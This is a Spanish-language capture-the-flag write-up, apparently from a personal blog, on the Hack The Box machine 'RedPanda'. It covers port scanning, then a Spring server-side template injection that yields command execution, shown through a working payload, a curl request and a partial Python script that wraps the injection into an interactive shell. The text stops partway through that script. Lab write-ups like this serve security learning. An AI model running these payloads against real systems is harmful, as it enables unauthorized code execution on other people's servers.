<!doctype html>
<html lang="es-ES"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <title>Bajo el Teclado</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="" />

    
    
    
    <link rel="stylesheet" href="../../css/theme.min.css">

    
    
    

    
  


</head>
<body>
        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
    <div class="row">
        
        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
            <a href="../../" class="text-decoration-none">
                <img id="home-image" class="rounded-circle"
                    
                        
                            src="../../pointed.jpeg"
                        
                    
                />
            </a>
        </div>
        <div class="col-sm-8 col-12 text-sm-left text-center">
        
            <h2 class="m-0 mb-2 mt-4">
                <a href="../../" class="text-decoration-none">
                    
                        pointedsec
                    
                </a>
            </h2>
            <p class="text-muted mb-1">
                
                    if pentester.found == bug { make(pentester,states.happy) }
                
            </p>
            <ul id="nav-links" class="list-inline mb-2">
                
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../" title="Home">/Home</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../about/" title="About">About</a>
                    </li>
                
                    <li class="list-inline-item">
                        <a class="badge badge-white " href="../../writeups/" title="Write-Up&#39;s">Write-Up&#39;s</a>
                    </li>
                
            </ul>
            <ul id="nav-social" class="list-inline">
                
                    <li class="list-inline-item mr-3">
                        <a href="http://github.com/pointedsec" target="_blank">
                            <i class="fab fa-github fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://www.linkedin.com/in/andr%C3%A9s-del-cerro-rodr%C3%ADguez-13a826293/" target="_blank">
                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="mailto:adelcerrorodriguez@gmail.com" target="_blank">
                            <i class="fas fa-at fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://pointedsec.vercel.app" target="_blank">
                            <i class="fas fa-globe fa-1x text-muted"></i>
                        </a>
                    </li>
                
                    <li class="list-inline-item mr-3">
                        <a href="https://app.hackthebox.com/profile/1575364" target="_blank">
                            <i class="fas fa-box fa-1x text-muted"></i>
                        </a>
                    </li>
                
            </ul>
        </div>
    </div>
    <hr />
</header>
<div class="container">
    <div class="pl-sm-4 ml-sm-5">
        <h1 id="hack-the-box-redpanda-writeup">Hack The Box: RedPanda Writeup</h1>
<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;RedPanda&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
<h1 id="tcp-enumeration">TCP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ rustscan -a 10.129.227.207 --ulimit <span style="color:#ae81ff">5000</span> -g
</span></span><span style="display:flex;"><span>10.129.227.207 -&gt; <span style="color:#f92672">[</span>22,8080<span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p22,8080 -sCV 10.129.227.207 -oN allPorts
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-02 21:19 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.207
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE    VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
</span></span><span style="display:flex;"><span>|_http-title: Red Panda Search | Made with Spring Boot
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">200</span> 
</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>UTF-8
</span></span><span style="display:flex;"><span>|     Content-Language: en-US
</span></span><span style="display:flex;"><span>|     Date: Fri, <span style="color:#ae81ff">02</span> Aug <span style="color:#ae81ff">2024</span> 17:20:08 GMT
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>|     &lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span> dir<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ltr&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;head&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta author<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wooden_k&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw --&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/panda.css&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;css/main.css&#34;</span> type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Red Panda Search | Made with Spring Boot&lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;/head&gt;
</span></span><span style="display:flex;"><span>|     &lt;body&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pande&#39;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear left&#39;</span>&gt;&lt;/div&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ear right&#39;</span>&gt;&lt;/div&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers left&#39;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style="display:flex;"><span>|     &lt;/div&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;whiskers right&#39;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style="display:flex;"><span>|     &lt;span&gt;&lt;/span&gt;
</span></span><span style="display:flex;"><span>|     &lt;/div&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;face&#39;</span>&gt;
</span></span><span style="display:flex;"><span>|     &lt;div class<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eye
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   HTTPOptions: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 200 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Allow: GET,HEAD,OPTIONS
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Fri, 02 Aug 2024 17:20:08 GMT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|   RTSPRequest: 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     HTTP/1.1 400 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Type: text/html;charset=utf-8
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Language: en
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Content-Length: 435
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Date: Fri, 02 Aug 2024 17:20:08 GMT
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Connection: close
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     &lt;!doctype html&gt;&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|     Request&lt;/title&gt;&lt;style type=&#34;text/css&#34;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF-Port8080-TCP:V=7.94SVN%I=7%D=8/2%Time=66AD3154%P=x86_64-pc-linux-gnu%r(
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:GetRequest,690,&#34;HTTP/1\.1\x20200\x20\r\nContent-Type:\x20text/html;char
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:set=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Fri,\x2002\x20Aug\x
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:202024\x2017:20:08\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20h
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tml&gt;\n&lt;html\x20lang=\&#34;en\&#34;\x20dir=\&#34;ltr\&#34;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20&lt;meta\x20charset=\&#34;utf-8\&#34;&gt;\n\x20\x20\x20\x20&lt;meta\x20author=\&#34;woo
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:den_k\&#34;&gt;\n\x20\x20\x20\x20&lt;!--Codepen\x20by\x20khr2003:\x20https://code
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:pen\.io/khr2003/pen/BGZdXw\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;style
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:sheet\&#34;\x20href=\&#34;css/panda\.css\&#34;\x20type=\&#34;text/css\&#34;&gt;\n\x20\x20\x20\
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;css/main\.css\&#34;\x20type=\&#34;text
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:/css\&#34;&gt;\n\x20\x20\x20\x20&lt;title&gt;Red\x20Panda\x20Search\x20\|\x20Made\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0with\x20Spring\x20Boot&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\n\n\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20\x20&lt;div\x20class=&#39;</span>pande<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20cl
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ass=&#39;</span>ear<span style="color:#ae81ff">\x</span>20left<span style="color:#e6db74">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>ear<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>SF:0right<span style="color:#e6db74">&#39;&gt;&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style="color:#ae81ff">\x</span>20left
</span></span><span style="display:flex;"><span>SF:<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20&lt;div\x20class=&#39;</span>whiskers<span style="color:#ae81ff">\x</span>20right<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20\x20\x2
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;span&gt;&lt;/span&gt;\n\x20\x20\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&lt;/div&gt;\n\x20\x20\x20\x20\x20\x20&lt;div\x20class=&#39;</span>face<span style="color:#e6db74">&#39;&gt;\n\x20\x20\x20\x20
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x20\x20\x20\x20&lt;div\x20class=&#39;</span>eye<span style="color:#e6db74">&#34;)%r(HTTPOptions,75,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20200</span>
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n</span>Allow:<span style="color:#ae81ff">\x</span>20GET,HEAD,OPTIONS<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span>200<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>SF:Fri,<span style="color:#ae81ff">\x</span>2002<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2017:20:08<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:n<span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;)%r(RTSPRequest,24E,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20tex
</span></span><span style="display:flex;"><span>SF:t/html;charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Content-Language:<span style="color:#ae81ff">\x</span>20en<span style="color:#ae81ff">\r\n</span>Content-Length:<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">204</span>
</span></span><span style="display:flex;"><span>SF:35<span style="color:#ae81ff">\r\n</span>Date:<span style="color:#ae81ff">\x</span>20Fri,<span style="color:#ae81ff">\x</span>2002<span style="color:#ae81ff">\x</span>20Aug<span style="color:#ae81ff">\x</span>202024<span style="color:#ae81ff">\x</span>2017:20:08<span style="color:#ae81ff">\x</span>20GMT<span style="color:#ae81ff">\r\n</span>Connecti
</span></span><span style="display:flex;"><span>SF:on:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>&lt;!doctype<span style="color:#ae81ff">\x</span>20html&gt;&lt;html<span style="color:#ae81ff">\x</span>20lang<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>en<span style="color:#ae81ff">\&#34;</span>&gt;&lt;head&gt;&lt;title
</span></span><span style="display:flex;"><span>SF:&gt;HTTP<span style="color:#ae81ff">\x</span>20Status<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request&lt;/title&gt;&lt;style<span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>SF:x20type<span style="color:#f92672">=</span><span style="color:#ae81ff">\&#34;</span>text/css<span style="color:#ae81ff">\&#34;</span>&gt;body<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-family:Tahoma,Arial,sans-serif;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
</span></span><span style="display:flex;"><span>SF:h1,<span style="color:#ae81ff">\x</span>20h2,<span style="color:#ae81ff">\x</span>20h3,<span style="color:#ae81ff">\x</span>20b<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>color:white;background-color:#525D76;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h1
</span></span><span style="display:flex;"><span>SF:<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:22px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h2<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:16px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20h3<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:14
</span></span><span style="display:flex;"><span>SF:px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20p<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>font-size:12px;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20a<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>color:black;<span style="color:#f92672">}</span><span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\.</span>line<span style="color:#ae81ff">\x</span>20<span style="color:#f92672">{</span>hei
</span></span><span style="display:flex;"><span>SF:ght:1px;background-color:#525D76;border:none;<span style="color:#f92672">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;
</span></span><span style="display:flex;"><span>SF:HTTP<span style="color:#ae81ff">\x</span>20Status<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request&lt;/h1&gt;&lt;/body&gt;&lt;/ht
</span></span><span style="display:flex;"><span>SF:ml&gt;<span style="color:#e6db74">&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 16.95 seconds
</span></span></span></code></pre></div><h1 id="udp-enumeration">UDP Enumeration</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap --top-ports <span style="color:#ae81ff">1500</span> -sU --min-rate <span style="color:#ae81ff">5000</span> -n -Pn 10.129.227.207 -oN allPorts.UDP
</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2024-08-02 21:20 CEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.227.207
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.036s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">1495</span> open|filtered udp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT      STATE  SERVICE
</span></span><span style="display:flex;"><span>53/udp    closed domain
</span></span><span style="display:flex;"><span>1025/udp  closed blackjack
</span></span><span style="display:flex;"><span>19718/udp closed unknown
</span></span><span style="display:flex;"><span>24388/udp closed unknown
</span></span><span style="display:flex;"><span>57977/udp closed unknown
</span></span></code></pre></div><p>Solo vemos los puertos 22/TCP y 8080/TCP
Así que la vía de explotación debe de ser por el servicio web.</p>
<h1 id="foothold">Foothold</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ whatweb http://10.129.227.207:8080
</span></span><span style="display:flex;"><span>http://10.129.227.207:8080 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Content-Language<span style="color:#f92672">[</span>en-US<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTML5, IP<span style="color:#f92672">[</span>10.129.227.207<span style="color:#f92672">]</span>, Title<span style="color:#f92672">[</span>Red Panda Search | Made with Spring Boot<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Sabemos que la aplicación web está hecha en Spring Boot, Java.</p>
<p>Vemos que tiene una funcionalidad de búsqueda y mi input se representa en pantalla, esto ya me hace pensar en intentar realizar un SSTI.
<img src="images/Screenshot_1.png" alt="Write-up Image"></p>
<p>Parece que tiene un filtro de caracteres.</p>
<p><img src="images/Screenshot_2.png" alt="Write-up Image">
Pero reemplazando el <code>$</code> por <code>*</code> , ya que en Spring se puede realizar &ldquo;templates&rdquo; con ese formato, conseguimos que se interprete código, confirmando el SSTI.
<img src="images/Screenshot_3.png" alt="Write-up Image"></p>
<p>Utilizando un payload de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">PayloadAllTheThings</a>
<code>*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}</code></p>
<p>Tenemos RCE como el usuario <code>woodenk</code>
<img src="images/Screenshot_4.png" alt="Write-up Image"></p>
<p>Por consola&hellip;</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s -X POST http://10.129.227.207:8080/search --data <span style="color:#e6db74">&#34;name=*%7BT%28org.apache.commons.io.IOUtils%29.toString%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D&#34;</span> | html2text
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>name                <span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>***** You searched <span style="color:#66d9ef">for</span>: uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>logs<span style="color:#f92672">)</span>,1000
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>woodenk<span style="color:#f92672">)</span> *****
</span></span><span style="display:flex;"><span>***** There are <span style="color:#ae81ff">0</span> results <span style="color:#66d9ef">for</span> your search *****
</span></span></code></pre></div><h1 id="scripting-the-ssti">Scripting the SSTI</h1>
<p>Inspirándome del gran s4vitar, me apetecía hacer un script en Python para automatizar el SSTI.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> signal
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> prompt_toolkit <span style="color:#f92672">import</span> PromptSession
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> prompt_toolkit.keys <span style="color:#f92672">import</span> Keys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ENDPOINT_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://10.129.227.207:8080/search&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">def_handler</span>(x,y):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Saliendo...&#34;</span>)
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>signal<span style="color:#f92672">.</span>signal(signal<span style="color:#f92672">.</span>SIGINT, def_handler)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ssti</span>(command):
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Content-Type&#34;</span>: <span style="color:#e6db74">&#34;application/x-www-form-urlencoded&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(&#39;&lt;COMMAND&gt;&#39;).getInputStream())}&#34;</span>
</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;name&#34;</span>: payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;&lt;COMMAND&gt;&#34;</span>, command)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(ENDPOINT_URL, headers <span style="color:#f92672">=</span> headers, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>    soup <span style="color:#f92672">=</span> BeautifulSoup(r<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>    output <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;h2&#39;</span>, class_<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;searched&#39;</span>)<span style="color:#f92672">.</span>text<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;You searched for: &#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>    output
</span></span><span style="display:flex;"><span>    print(output)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    session <span style="color:#f92672">=</span> PromptSession()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
